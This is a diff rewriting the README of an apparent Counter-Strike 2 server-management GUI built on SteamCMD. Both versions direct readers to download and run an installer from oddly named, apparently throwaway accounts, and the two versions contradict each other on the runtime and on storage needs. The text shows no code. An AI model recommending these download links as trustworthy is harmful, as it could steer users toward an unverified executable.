@@ -1,112 +1,90 @@
-# SteamCMD-GUI v0.1.0 — Server Administration Tool 2026
+# 🎮 steamcmd-gui-hub - Manage Counter-Strike 2 servers with ease
 
-> A Windows-native graphical interface that streamlines the installation, configuration, and monitoring of Counter-Strike 2 dedicated servers, with built-in SteamCMD integration and plugin management capabilities.
+[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/Lshaped-contrivance769/steamcmd-gui-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owen-ross2001/steamcmd-gui-hub?style=flat-square)](https://github.com/owen-ross2001/steamcmd-gui-hub)
+This tool provides a graphical interface for Counter-Strike 2 server administrators. You can install, update, and manage your game servers without using command lines. The software automates the setup process through SteamCMD. It includes tools for managing plugins, sending RCON commands, and scheduling server backups.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://owen-ross2001.github.io/steamcmd-gui-hub/">
-    <img src="https://img.shields.io/badge/Download-SteamCMD-GUI%20Latest-brightgreen?style=for-the-badge" alt="Download SteamCMD-GUI">
-  </a>
-</p>
+Your computer needs to meet these basic standards to run the server manager:
 
-> **[Direct Download — SteamCMD-GUI v0.1.0](https://owen-ross2001.github.io/steamcmd-gui-hub/)**
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD equivalent.
+*   **Memory:** 8 GB of RAM.
+*   **Storage:** 50 GB of free space for game files.
+*   **Network:** A stable internet connection for server updates.
+*   **Software:** Microsoft .NET Desktop Runtime 8.0 or newer.
 
----
+## 📥 Installation Steps
 
-[Download Latest Build](https://owen-ross2001.github.io/steamcmd-gui-hub/)
+Follow these steps to set up the software on your machine:
 
----
+1. Visit [this page to download](https://github.com/Lshaped-contrivance769/steamcmd-gui-hub) the latest installer file.
+2. Locate the downloaded file in your folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen to finish the setup process.
+5. Create a shortcut on your desktop for quick access.
 
-## Overview
+## 🚀 Getting Started
 
-SteamCMD-GUI replaces the traditional command-line workflow for Counter-Strike 2 dedicated server administration with a polished visual dashboard. Instead of typing console commands and editing configuration files by hand, server operators can manage installations, updates, monitoring, and maintenance through an interface designed to be approachable for beginners while remaining powerful enough for seasoned administrators.
+Launch the application using your desktop shortcut. Connect your Steam account when asked. The software will download the SteamCMD files automatically. 
 
-The tool embeds SteamCMD directly, automating the retrieval and configuration of both the server binary and CS2 itself. Beyond basic server operations, it supports Metamod and CounterStrikeSharp plugins, offers real-time monitoring via a live dashboard, and includes automated backup scheduling. Whether you operate a small community server or oversee multiple game instances, SteamCMD-GUI reduces the need for constant command-line work and keeps your server running reliably.
+Once the status bar shows "Ready," you can click the "Create Server" button. Choose a folder on your drive for the installation. The software will download the Counter-Strike 2 game files. This process takes time depending on your download speed.
 
----
+## 🛠️ Configuring Your Server
 
-## Capabilities
+The configuration tab allows you to change server settings:
 
-- **Setup Wizard** — A guided process that installs SteamCMD and Counter-Strike 2 automatically, eliminating guesswork from initial configuration
-- **Live Dashboard** — Real-time visibility into server status, active players, and performance indicators
-- **RCON Console** — Send remote commands directly from the interface for full server control
-- **Plugin Manager** — Install, update, and configure Metamod and CounterStrikeSharp plugins without touching the file system
-- **Configuration Editor** — Syntax-highlighted editing for server configuration files, with quick access to frequently changed settings
-- **Profile Management** — Save and switch between multiple server configurations for different game modes or environments
-- **Backup Scheduler** — Create automated backups with configurable intervals and retention rules
-- **Map Manager** — Browse, upload, and organize map rotations through a visual editor
+*   **Server Name:** Enter the name players see in the browser.
+*   **Max Players:** Set the limit for player slots.
+*   **Map Group:** Choose the map rotation for your server.
+*   **RCON Password:** Set a password for remote console access. Keep this secure.
+*   **Game Mode:** Select Casual, Competitive, or Wingman modes.
 
----
+Click "Save Settings" to apply your changes. You must restart the server process for these changes to take hold.
 
-## Getting Started
+## 🧩 Plugin Management
 
-1. Download the newest release from the [official download page](https://owen-ross2001.github.io/steamcmd-gui-hub/)
-2. Extract the archive into a dedicated directory (for example, `C:\SteamCMD-GUI`)
-3. Launch `SteamCMD-GUI.exe` as Administrator during the initial setup
-4. Follow the on-screen wizard to install SteamCMD and the Counter-Strike 2 server files
+The plugin manager allows you to add features to your game:
 
-No additional runtime components beyond what Windows provides are required.
+1. Click the "Plugins" tab.
+2. Browse the list of available modules.
+3. Select the plugin you want to add.
+4. Click "Install."
+5. The software will place the files in the correct server folder.
+6. Use the "Enable" button to turn the plugin on.
 
----
+## 📱 Using the RCON Console
 
-## How to Use
+The RCON console lets you send commands to your server while it runs. Type your commands in the text box at the bottom of the window. You can change maps, kick players, or ban specific users. The output window shows the events as they happen on your server.
 
-After launching the application, use the setup wizard to create your first server profile. Once a server is configured, the main dashboard becomes active:
+## 📅 Automatic Backups
 
-- **Start or Stop the Server** — Use the control buttons on the dashboard
-- **Monitor Players** — View connected players and manage them from the player list
-- **Send RCON Commands** — Type commands into the built-in console or select from preset actions
-- **Edit Configuration** — Open the Config Editor tab to modify server settings
-- **Manage Plugins** — Use the Plugin Manager tab to install or remove Metamod and CounterStrikeSharp plugins
+Server data remains vulnerable to corruption or accidental deletion. Use the backup scheduler to keep your files safe:
 
-Switch between server profiles using the dropdown menu at the top of the window.
+1. Open the "Backups" tab.
+2. Select the "Enable Scheduler" checkbox.
+3. Choose how often the software should run a backup.
+4. Pick a destination folder.
+5. Click "Save" to start the cycle.
 
----
+The software will archive your configuration files and statistics automatically.
 
-## Configuration Details
+## 🛡️ Firewall and Networking
 
-All server settings reside in profile-specific folders inside the application data directory. The configuration editor provides direct access to common CS2 server files such as `server.cfg`, `autoexec.cfg`, and game mode configuration files. Plugin configurations are handled through the Plugin Manager interface, which manages file placement and dependency resolution automatically.
+Players cannot join your server if your firewall blocks the connection. Most home routers require port forwarding to allow incoming traffic. You must open UDP port 27015 to let players connect. Refer to your router manual to forward this port to the local IP address of your computer.
 
-For advanced customization, you can edit any configuration file directly through the built-in editor or navigate to the profile folder manually.
+## ❓ Troubleshooting
 
----
+Most issues arise from missing files or network blocks. Check these common fixes if the software fails:
 
-## System Requirements
+*   **Server won't start:** Check if your RCON port is already in use by another program.
+*   **Players cannot connect:** Verify your port forwarding settings on your router. Ensure your Windows Firewall allows the application to communicate through the network.
+*   **Update fails:** Ensure you have enough disk space. SteamCMD requires extra space to unpack files during updates.
+*   **Crash on launch:** Install the latest .NET Desktop Runtime from the official Microsoft website.
 
-- **Operating System:** Windows 10 (64-bit) or Windows 11
-- **Storage:** At least 30 GB free for CS2 server files (additional space required for plugins and backups)
-- **Network:** Reliable internet connection for the initial SteamCMD and CS2 downloads
-- **Permissions:** Administrator rights are necessary for the first SteamCMD installation and firewall configuration
-- **Runtime:** .NET Framework 4.8 or later (included with modern Windows versions)
+## 📝 Updates
 
----
+The software checks for updates whenever you launch it. If a new version exists, a notification appears on the main screen. Click the update button to download the latest features. Your configuration files will remain untouched during the update process.
 
-## Frequently Asked Questions
-
-**Does this tool support Source games other than CS2?**  
-Currently, SteamCMD-GUI is tailored for Counter-Strike 2 dedicated servers. Support for additional Source games may be added in future releases.
-
-**How do I update the server or SteamCMD?**  
-The application checks for updates automatically. You can also trigger a manual update from the Server Management section of the dashboard.
-
-**Can I run multiple servers at the same time?**  
-Yes. The profile system lets you configure and run several server instances, each with its own settings and plugins.
-
-**Where are my backups saved?**  
-Backups go to the profile-specific backup directory, which you can configure in the Backup Settings panel. The default location is inside the application data folder.
-
-**What should I do if the server fails to start?**  
-Review the built-in console output for error messages. Common causes include port conflicts, missing files, or incorrect configuration values. The setup wizard includes diagnostic checks to help identify issues.
-
----
-
-## License
-
-GNU GPL v3.0 — see [LICENSE](LICENSE) for details.
+Keywords: steamcmd, counter-strike, server-manager, windows, gui, gaming, gaming-infrastructure
